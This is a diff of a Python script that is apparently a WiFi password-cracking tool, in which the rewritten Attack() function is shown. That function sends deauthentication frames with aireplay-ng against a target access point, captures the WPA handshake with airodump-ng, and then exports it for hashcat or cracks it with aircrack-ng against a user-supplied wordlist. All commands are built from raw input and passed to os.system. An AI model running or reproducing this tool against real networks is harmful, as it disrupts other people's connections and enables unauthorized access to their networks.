@@ -140,10 +140,6 @@ while True:
         else:
             print(Latitude)
             print(Longitude)
-            #B = (Latitude+","+Longitude +"&key="+ GoogleApiKey)
-            #body = urlopen("https://maps.googleapis.com/maps/api/geocode/json?latlng="+B)
-            #print (body.read())
-            #B = ""
 
     def external_ip():
         print("")
@@ -311,24 +307,26 @@ while True:
                     lines = F.read().splitlines()
                     NETWORK_CARD = lines[CARD]
 
-                def Attack():
-                    global ADDRESS
-                    global CHANNEL
-                    global NETWORK_CARD
-                    print("do a thing.... please")
-                    os.system("sudo aireplay-ng -0 100 -a "+ ADDRESS +"  "+ NETWORK_CARD +" & sudo airodump-ng --bssid "+ ADDRESS+" --channel "+ CHANNEL +" --output-format cap --write ~/Desktop/Breaker " + NETWORK_CARD)
+            def Attack():
+                global ADDRESS
+                global CHANNEL
+                global NETWORK_CARD
+                print("do a thing.... please")
+                os.system("sudo xterm -e sudo airodump-ng --bssid "+ ADDRESS+" --channel "+ CHANNEL +" --output-format cap --write ~/Desktop/Breaker " + NETWORK_CARD + "& sudo aireplay-ng -0 100 -a "+ ADDRESS +"  "+ NETWORK_CARD)
+                time.sleep(5)
+                os.system("kill %1 && clear")
+                print("")
+                B = input("Do you want to export the file so it can work in hashcat? (Y/N)")
+                if(B == "Y" or B == "y"):
+                    os.system("aircrack-ng ~/Desktop/Breaker.cap -f hashcat")
+                else:
                     print("")
-                    B = input("Do you want to export the file so it can work in hashcat? (Y/N)")
-                    if(B == "Y" or B == "y"):
-                        os.system("aircrack-ng ~/Desktop/Breaker.cap -f hashcat")
-                    else:
-                        print("")
-                        B = input("Would you like to strat cracking the Password(Y/N)")
-                        if(B == "Y" or B == "y"):
-                            Password = input("Please enter the path for your Password List: ")
-                            os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password+ " ~/Desktop/Breaker.cap")
-                        else:
-                            print("")
+                B = input("Would you like to strat cracking the Password(Y/N)")
+                if(B == "Y" or B == "y"):
+                    Password = input("Please enter the path for your Password List: ")
+                    os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password+ " ~/Desktop/Breaker.cap")
+                else:
+                    print("")
                 
 
             def Menu():
